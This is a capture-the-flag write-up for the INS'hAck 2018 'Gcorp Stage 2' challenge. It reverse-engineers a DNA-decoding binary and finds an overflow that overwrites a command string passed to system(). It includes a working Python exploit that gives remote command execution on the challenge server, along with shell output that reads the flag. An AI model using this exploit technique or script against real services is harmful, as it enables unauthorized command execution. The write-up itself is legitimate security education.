# INS'hAck CTF 2018 - Gcorp Stage 2

>All you need to do is to `pwn` using some DNA samples...
>
>Once you gathered enough information, go [checkout this](https://gcorp-stage-2.ctf.insecurity-insa.fr/)
>
>Note: you should validate stage 1 to have more information on stage 2.

The binary for this challenge was inside a pcap file from stage 1.

If we visit the site we are presented with this message:
```
                        G-Corp DNA Decoder



    -._    _.--'"`'--._    _.--'"`'--._    _.--'"`'--._    _

        '-:`.'|`|"':-.  '-:`.'|`|"':-.  '-:`.'|`|"':-.  '.` : '.

      '.  '.  | |  | |'.  '.  | |  | |'.  '.  | |  | |'.  '.:   '.  '.

      : '.  '.| |  | |  '.  '.| |  | |  '.  '.| |  | |  '.  '.  : '.  `.

      '   '.  `.:_ | :_.' '.  `.:_ | :_.' '.  `.:_ | :_.' '.  `.'   `.

             `-..,..-'       `-..,..-'       `-..,..-'       `         `





POST valid DNA data (input limited to 1024 bytes).
```
DNA can be represented using strings of letters, and inside the pcap of stage 1 there were indeed some of these. Now we could just reverse the binary or trying to send some POST requests to the server.
We first tried the second option.

If we send a POST request containing `A` the program responds with:
```
DNA data size should be a multiple of 4!
failed to convert DNA to binary!
```
The server expects a string with a length multiple of 4, so we can try with `AAAA`. The program will respond with `\x00`.

If we do some more tries we can find that only some letters are valid and we can identify them just by sending a string with all letters and removing one by one the unaccepted ones.
After few requests we can spot a pattern, if we send `AAAA` we get `\x00`, if we send `AAAC` we get `\x01`...and so on.
Apparently the program converts every 4-byte block, which is a number represented in base 4, using `ACGT` instead of `0123`, into base 10 and then sends back the decoded string.

We tried sending `pwn` and shellcodes encoded accordingly to this format but without getting any shell. So, we then opened the binary in IDA to see if our blackbox analysis was right.

This is the decompiled main function:
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *gcmd_; // rax
  int gidat_len; // [rsp+18h] [rbp-8h]
  int nconverted; // [rsp+1Ch] [rbp-4h]

  memset(gcmd, 0, 64uLL);
  gcmd_ = &gcmd[strlen(gcmd)];
  *(_QWORD *)gcmd = 'd($ ohce';
  *((_QWORD *)gcmd_ + 1) = '/ > )eta';
  *((_QWORD *)gcmd_ + 2) = '.and/pmt';
  *((_DWORD *)gcmd_ + 6) = 'gol';               // gcmd points now to "echo $(date) > /tmp/dna.log"
  gidat_len = read(0, gidat, 1024uLL);
  if ( gidat[gidat_len - 1] == '\n' )
    --gidat_len;
  nconverted = dna_to_bin(gidat_len);
  if ( nconverted < 0 )
  {
    puts("failed to convert DNA to binary!");
    exit(1);
  }
  system(gcmd);
  write(1, godat, nconverted);
  exit(0);
}
```
The program first zeroes out 64 bytes at `gcmd`, then gets a pointer to the first byte of `gcmd` because `strlen(gcmd)` is 0, since `gcmd` was zeroed out, and uses this pointer to write at that memory address 4 bytes at a time. This is equivalent to setting `gcmd` to `echo $(date) > /tmp/dna.log`. We can see that this string is later passed to `system()`, and then a write to stdout is performed (this is the decoded message that is echoed back).
Before calling `dna_to_bin()` our input is copied into `gidat`.

So let's check a moment where are those variables stored:
```
.bss:0000000000201040 ; _BYTE godat[128]
.bss:0000000000201040 godat           db 80h dup(?)           ; DATA XREF: dna_to_bin+37↑o
.bss:0000000000201040                                         ; main+F6↑o
.bss:00000000002010C0 ; char gcmd[64]
.bss:00000000002010C0 gcmd            db 40h dup(?)           ; DATA XREF: main+19↑o
.bss:00000000002010C0                                         ; main+25↑o ...
.bss:0000000000201100 ; _BYTE gidat[1024]
.bss:0000000000201100 gidat           db 400h dup(?)          ; DATA XREF: dna_to_bin+4A↑o
.bss:0000000000201100                                         ; main+89↑o ...
```
Our variables are stored in `.bss`. If we had a write of more than `128` bytes to `godat` we could use the overflow to overwrite `gcmd` and gain code execution through `system(gcmd)`.

Let's analyze the `dna_to_bin()` function:
```c
signed __int64 __fastcall dna_to_bin(int gidat_len)
{
  signed __int64 result; // rax
  int i; // [rsp+1Ch] [rbp-4h]

  if ( gidat_len & 3 )
  {
    puts("DNA data size should be a multiple of 4!");
    result = 0xFFFFFFFFLL;
  }
  else
  {
    for ( i = 0; i < gidat_len / 4; ++i )
    {
      if ( (unsigned int)d2b((__int64)&gidat[4 * i], &godat[i]) )
      {
        puts("DNA data contains a unknown character!");
        return 0xFFFFFFFFLL;
      }
    }
    result = gidat_len / 4;
  }
  return result;
}
```
After a check on the input size, it executes a loop which calls `d2b` on `gidat[4*i]` and `godat[i]`.

Let's analyze `d2b`:
```c
signed __int64 __fastcall d2b(__int64 ptr_gidat, _BYTE *ptr_godat)
{
  signed int letter; // eax
  char n; // [rsp+1Bh] [rbp-5h]
  signed int i; // [rsp+1Ch] [rbp-4h]

  n = 0;
  for ( i = 0; i <= 3; ++i )
  {
    letter = *(char *)(i + ptr_gidat);
    if ( letter == 'C' )
    {
      n |= 1 << 2 * (3 - i);
    }
    else if ( letter > 'C' )
    {
      if ( letter == 'G' )
      {
        n |= 2 << 2 * (3 - i);
      }
      else
      {
        if ( letter != 'T' )
        {
LABEL_12:
          printf("unknown: %c\n", (unsigned int)*(char *)(i + ptr_gidat), ptr_godat);
          return 0xFFFFFFFFLL;
        }
        n |= 3 << 2 * (3 - i);
      }
    }
    else if ( letter != 'A' )
    {
      goto LABEL_12;
    }
  }
  *ptr_godat = n;
  return 0LL;
}
```
This function simply performs the base conversion from 4 to 10 of our input stored at `gidat` and then stores the result in...`godat`!!
We can write up to 1024-bytes at `gidat` and the conversion is done reading 4-bytes at a time at `gidat` and writing 1 byte representing the converted value at `godat`, so there can be overflow!

We need a payload that after being decoded looks like this: `|PADDING_128_BYTES|CMD|`.

Since we had some issues with pwntools interactive mode, due to SSL, we wrote a dirty python script to simulate a shell.

```python
#!/usr/bin/env python2
import requests
import string
import sys

charset = "ACGT"

#found somewhere on the internet
def base10toN(num,n):
    new_num_string=''
    current=num
    while current!=0:
        remainder=current%n
        if 36>remainder>9:
            remainder_string=string.lowercase[remainder-10]
        elif remainder>=36:
            remainder_string='('+str(remainder)+')'
        else:
            remainder_string=str(remainder)
        new_num_string=remainder_string+new_num_string
        current=current/n
    return new_num_string

def encode(s):
  e = ""
  for c in s:
    n = base10toN(ord(c),4).rjust(4, "0")
    for d in n:
      e += charset[int(d)]
  return e

while True:
    cmd = "A"*128+raw_input("> ")+"\x00"
    pay = encode(cmd)
    resp = requests.post("https://gcorp-stage-2.ctf.insecurity-insa.fr", data=pay).text.replace(cmd, "")
    if resp[-1] != "\n":
        resp += "\n"
    sys.stdout.write(resp)
```
We can now run our exploit:
```
$ ./exploit.py
> ls -la
total 916
drwxr-xr-x    1 gcorp    root          4096 Apr  7 10:07 .
drwxr-xr-x    1 root     root          4096 Apr  7 10:07 ..
-rw-rw-r--    1 gcorp    root            70 Apr  7 10:07 .flag.txt
-rwxrwxr-x    1 gcorp    root        913312 Apr  7 10:07 dna_decoder
-rw-rw-r--    1 gcorp    root         10215 Apr  7 10:05 stage_3_storage.zip
> cat .flag.txt
INSA{1fb977db25976d7e1a0fb713383de1cea90b2d15b4173708d867be3793571ed9}
```
You can find the binary of the challenge and a python exploit for it [here](https://github.com/ndaprela/CTF/tree/master/2018/INShAck2018/GCorp_Stage_2).
